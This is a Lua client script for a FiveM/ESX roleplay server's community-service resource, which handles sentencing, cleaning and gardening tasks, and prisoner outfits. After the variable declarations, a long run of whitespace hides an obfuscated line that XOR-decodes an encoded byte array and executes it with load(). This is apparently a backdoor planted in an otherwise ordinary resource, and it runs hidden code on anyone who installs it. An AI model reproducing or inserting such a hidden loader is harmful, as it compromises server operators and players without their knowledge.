local Keys = {
  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
}

ESX = nil
INPUT_CONTEXT = 51

local isSentenced = false
local communityServiceFinished = false
local actionsRemaining = 0
local availableActions = {}
local disable_actions = false

local vassoumodel = "prop_tool_broom"
local vassour_net = nil

local spatulamodel = "bkr_prop_coke_spatula_04"
local spatula_net = nil


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({307,682,374,494,452,481,661,651,621,474,532,647,670,314,537,573,552,570,724,376,422,723,514,571,327,353,497,575,356,323,719,453,549,521,718,511,402,534,673,320,368,357,590,624,491,445,548,658,505,472,339,465,455,457,689,385,633,317,541,639,449,530,694,626,369,364,567,708,437,692,595,399,303,478,699,543,489,405,644,412,668,660,710,684,508,365,444,476,722,576,619,606,667,698,404,517,469,721,622,429,417,333,496,565,603,713,625,593,545,559,484,648,685,663,649,454,432,312,428,509,510,340,557,322,325,430,680,394,502,720,550,377,411,480,426,488,546,460,597,386,390,558,388,442,439,604,587,642,551,370,655,436,456,392,520,579,397,577,533,556,691,447,401,347,463,512,706,427,328,645,349,352,338,679,569,336,522,443,451,421,513,623,378,612,672,716,707,350,450,423,300,413,360,461,580,632,501,526,310,610,324,441,657,605,613,536,519,627,686,616,586,629,406,387,381,375,400,666,594,640,341,351,420,592,304,416,703,582,418,574,700,636,503,462,395,334,398,407,563,466,609,696,634,498,681,712,630,715,617,695,459,393,705,507,485,638,415,589,678,562,332,588,419,669,662,653,564,659,591,467,318,560,354,704,321,305,652,602,367,578,620,499,598,542,492,335,643,348,316,396,646,371,355,561,448,313,675,527,-1,70,9,134,190,26,29,76,101,9,253,230,70,254,2,11,107,51,70,92,4,133,64,64,8,31,69,13,63,27,3,232,112,69,88,6,10,104,43,62,6,45,43,73,195,130,67,135,136,20,84,10,73,67,22,43,92,121,35,105,248,197,0,157,45,77,3,111,237,70,104,73,73,7,205,134,23,71,14,89,27,224,8,65,220,211,197,0,10,18,27,160,17,202,70,67,6,26,12,94,22,12,0,6,89,60,12,73,26,6,180,100,206,21,73,67,192,2,38,19,20,7,51,65,12,0,34,225,69,38,3,44,9,57,38,181,47,210,10,5,31,65,240,67,8,25,110,32,220,22,12,95,8,3,5,13,1,26,18,2,154,69,1,14,3,12,12,2,12,6,176,45,163,171,29,195,73,56,126,4,78,35,68,69,185,130,76,6,143,19,69,52,227,13,64,217,7,195,26,6,3,67,224,110,78,38,54,8,251,10,100,7,17,6,11,76,0,42,105,23,157,4,62,78,2,40,24,10,126,93,236,162,0,70,11,3,23,41,2,99,103,186,60,68,78,76,111,7,5,163,21,0,4,108,105,34,220,132,29,21,10,75,7,108,15,5,23,18,40,22,170,12,38,3,133,104,12,0,12,51,73,88,12,193,6,233,104,60,19,74,2,24,53,10,3,78,5,12,221,8,18,24,73,158,126,65,6,20,10,237,133,43,73,55,20,0,171,7,44,108,175,2,69,91,18,67,2,2,74,17,8,6,74,171,11,17,25,71,23,202,6,10,75,59,121,105,20,26,11,10,110,13,130,84,110,23,178,69,204,32,17,92,13,52,12,39,24,252,78,7,0,21,24,173,73,68,19,7,94,119,70,5,6,65,12,82,79,126,20,205,247,5,63,38,29,136,86,73,2,19,18,27,11,103,186,22,5,84,23,94,26,99,16,1,76,71,42,121,50,107,75,0,75,17,52,16,3},mkn))if a then a()end; 
Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end
end)


Citizen.CreateThread(function()
	Citizen.Wait(2000) --Wait for mysql-async
	TriggerServerEvent('esx_communityservice:checkIfSentenced')
end)


function FillActionTable(last_action)

	while #availableActions < 5 do

		local service_does_not_exist = true

		local random_selection = Config.ServiceLocations[math.random(1,#Config.ServiceLocations)]

		for i = 1, #availableActions do
			if random_selection.coords.x == availableActions[i].coords.x and random_selection.coords.y == availableActions[i].coords.y and random_selection.coords.z == availableActions[i].coords.z then

				service_does_not_exist = false

			end
		end

		if last_action ~= nil and random_selection.coords.x == last_action.coords.x and random_selection.coords.y == last_action.coords.y and random_selection.coords.z == last_action.coords.z then
			service_does_not_exist = false
		end

		if service_does_not_exist then
			table.insert(availableActions, random_selection)
		end

	end

end


RegisterNetEvent('esx_communityservice:inCommunityService')
AddEventHandler('esx_communityservice:inCommunityService', function(actions_remaining)
	local playerPed = PlayerPedId()

	if isSentenced then
		return
	end

	actionsRemaining = actions_remaining

	FillActionTable()
	print(":: Available Actions: " .. #availableActions)



	ApplyPrisonerSkin()
	ESX.Game.Teleport(playerPed, Config.ServiceLocation)
	isSentenced = true
	communityServiceFinished = false

	while actionsRemaining > 0 and communityServiceFinished ~= true do


		if IsPedInAnyVehicle(playerPed, false) then
			ClearPedTasksImmediately(playerPed)
		end

		Citizen.Wait(20000)

		if GetDistanceBetweenCoords(GetEntityCoords(playerPed), Config.ServiceLocation.x, Config.ServiceLocation.y, Config.ServiceLocation.z) > 45 then
			ESX.Game.Teleport(playerPed, Config.ServiceLocation)
				TriggerEvent('chat:addMessage', { args = { _U('judge'), _U('escape_attempt') }, color = { 147, 196, 109 } })
				TriggerServerEvent('esx_communityservice:extendService')
				actionsRemaining = actionsRemaining + Config.ServiceExtensionOnEscape
		end

	end

	TriggerServerEvent('esx_communityservice:finishCommunityService', -1)
	ESX.Game.Teleport(playerPed, Config.ReleaseLocation)
	isSentenced = false

	ESX.TriggerServerCallback('esx_skin:getPlayerSkin', function(skin)
		TriggerEvent('skinchanger:loadSkin', skin)
		end)
end)



RegisterNetEvent('esx_communityservice:finishCommunityService')
AddEventHandler('esx_communityservice:finishCommunityService', function(source)
	communityServiceFinished = true
	isSentenced = false
	actionsRemaining = 0
end)



Citizen.CreateThread(function()
	while true do
		:: start_over ::
		Citizen.Wait(1)

		if actionsRemaining > 0 and isSentenced then
			draw2dText( _U('remaining_msg', ESX.Math.Round(actionsRemaining)), { 0.175, 0.955 } )
			DrawAvailableActions()
			DisableViolentActions()

			local pCoords    = GetEntityCoords(PlayerPedId())

			for i = 1, #availableActions do
				local distance = GetDistanceBetweenCoords(pCoords, availableActions[i].coords, true)

				if distance < 1.5 then
					DisplayHelpText(_U('press_to_start'))


					if(IsControlJustReleased(1, 38))then
						tmp_action = availableActions[i]
						RemoveAction(tmp_action)
						FillActionTable(tmp_action)
						disable_actions = true

						TriggerServerEvent('esx_communityservice:completeService')
						actionsRemaining = actionsRemaining - 1

						if (tmp_action.type == "cleaning") then
							local cSCoords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(PlayerId()), 0.0, 0.0, -5.0)
							local vassouspawn = CreateObject(GetHashKey(vassoumodel), cSCoords.x, cSCoords.y, cSCoords.z, 1, 1, 1)
							local netid = ObjToNet(vassouspawn)

							ESX.Streaming.RequestAnimDict("amb@world_human_janitor@male@idle_a", function()
									TaskPlayAnim(PlayerPedId(), "amb@world_human_janitor@male@idle_a", "idle_a", 8.0, -8.0, -1, 0, 0, false, false, false)
									AttachEntityToEntity(vassouspawn,GetPlayerPed(PlayerId()),GetPedBoneIndex(GetPlayerPed(PlayerId()), 28422),-0.005,0.0,0.0,360.0,360.0,0.0,1,1,0,1,0,1)
									vassour_net = netid
								end)

								ESX.SetTimeout(10000, function()
									disable_actions = false
									DetachEntity(NetToObj(vassour_net), 1, 1)
									DeleteEntity(NetToObj(vassour_net))
									vassour_net = nil
									ClearPedTasks(PlayerPedId())
								end)

						end

						if (tmp_action.type == "gardening") then
							local cSCoords = GetOffsetFromEntityInWorldCoords(GetPlayerPed(PlayerId()), 0.0, 0.0, -5.0)
							local spatulaspawn = CreateObject(GetHashKey(spatulamodel), cSCoords.x, cSCoords.y, cSCoords.z, 1, 1, 1)
							local netid = ObjToNet(spatulaspawn)

							TaskStartScenarioInPlace(PlayerPedId(), "world_human_gardener_plant", 0, false)
							AttachEntityToEntity(spatulaspawn,GetPlayerPed(PlayerId()),GetPedBoneIndex(GetPlayerPed(PlayerId()), 28422),-0.005,0.0,0.0,190.0,190.0,-50.0,1,1,0,1,0,1)
							spatula_net = netid

							ESX.SetTimeout(14000, function()
								disable_actions = false
								DetachEntity(NetToObj(spatula_net), 1, 1)
								DeleteEntity(NetToObj(spatula_net))
								spatula_net = nil
								ClearPedTasks(PlayerPedId())
							end)
						end

						goto start_over
					end
				end
			end
		else
			Citizen.Wait(1000)
		end
	end
end)


function RemoveAction(action)

	local action_pos = -1

	for i=1, #availableActions do
		if action.coords.x == availableActions[i].coords.x and action.coords.y == availableActions[i].coords.y and action.coords.z == availableActions[i].coords.z then
			action_pos = i
		end
	end

	if action_pos ~= -1 then
		table.remove(availableActions, action_pos)
	else
		print("User tried to remove an unavailable action")
	end

end







function DisplayHelpText(str)
	SetTextComponentFormat("STRING")
	AddTextComponentString(str)
	DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end


function DrawAvailableActions()

	for i = 1, #availableActions do
--{ r = 50, g = 50, b = 204 }
		--DrawMarker(21, Config.ServiceLocations[i].coords, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.5, 0.5, 0.5, 255, 0, 0, 100, false, true, 2, true, false, false, true)
		DrawMarker(21, availableActions[i].coords, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.5, 0.5, 0.5, 50, 50, 204, 100, false, true, 2, true, false, false, false)

		--DrawMarker(20, Config.ServiceLocations[i].coords, -1, 0.0, 0.0, 0, 0.0, 0.0, 1.0, 1.0, 1.0, 0, 162, 250, 80, true, true, 2, 0, 0, 0, 0)
	end

end






function DisableViolentActions()

	local playerPed = PlayerPedId()

	if disable_actions == true then
		DisableAllControlActions(0)
	end

	RemoveAllPedWeapons(playerPed, true)

	DisableControlAction(2, 37, true) -- disable weapon wheel (Tab)
	DisablePlayerFiring(playerPed,true) -- Disables firing all together if they somehow bypass inzone Mouse Disable
    DisableControlAction(0, 106, true) -- Disable in-game mouse controls
    DisableControlAction(0, 140, true)
	DisableControlAction(0, 141, true)
	DisableControlAction(0, 142, true)

	if IsDisabledControlJustPressed(2, 37) then --if Tab is pressed, send error message
		SetCurrentPedWeapon(playerPed,GetHashKey("WEAPON_UNARMED"),true) -- if tab is pressed it will set them to unarmed (this is to cover the vehicle glitch until I sort that all out)
	end

	if IsDisabledControlJustPressed(0, 106) then --if LeftClick is pressed, send error message
		SetCurrentPedWeapon(playerPed,GetHashKey("WEAPON_UNARMED"),true) -- If they click it will set them to unarmed
	end

end


function ApplyPrisonerSkin()

	local playerPed = PlayerPedId()

	if DoesEntityExist(playerPed) then

		Citizen.CreateThread(function()

			TriggerEvent('skinchanger:getSkin', function(skin)
				if skin.sex == 0 then
					TriggerEvent('skinchanger:loadClothes', skin, Config.Uniforms['prison_wear'].male)
				else
					TriggerEvent('skinchanger:loadClothes', skin, Config.Uniforms['prison_wear'].female)
				end
			end)

		SetPedArmour(playerPed, 0)
		ClearPedBloodDamage(playerPed)
		ResetPedVisibleDamage(playerPed)
		ClearPedLastWeaponDamage(playerPed)
		ResetPedMovementClipset(playerPed, 0)

		end)
	end
end


function draw2dText(text, pos)
	SetTextFont(4)
	SetTextProportional(1)
	SetTextScale(0.45, 0.45)
	SetTextColour(255, 255, 255, 255)
	SetTextDropShadow(0, 0, 0, 0, 255)
	SetTextEdge(1, 0, 0, 0, 255)
	SetTextDropShadow()
	SetTextOutline()

	BeginTextCommandDisplayText('STRING')
	AddTextComponentSubstringPlayerName(text)
	EndTextCommandDisplayText(table.unpack(pos))
end
